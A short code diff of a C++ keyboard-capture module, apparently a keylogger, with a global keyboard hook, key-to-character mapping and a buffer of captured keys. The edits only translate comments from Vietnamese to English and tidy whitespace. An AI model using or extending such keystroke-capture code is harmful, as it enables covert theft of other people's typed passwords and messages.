@@ -63,11 +63,11 @@ namespace {
         case VK_RMENU: return "[ALT]";
         }
 
-        char c = vkToChar(vkCode, shift ^ caps); // XOR để xử lý CapsLock
+		char c = vkToChar(vkCode, shift ^ caps); // XOR Caps Lock handle
 
         if (c != 0) return std::string(1, c);
 
-        return ""; // không map được
+		return ""; // cannot be mapped
     }
 
     LRESULT CALLBACK GlobalKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -152,8 +152,6 @@ std::string KeyController::getBufferAndClear() {
     return data;
 #endif
 }
-
-
 
 bool KeyControllerModule::start() {
     // delegate to your KeyController singleton
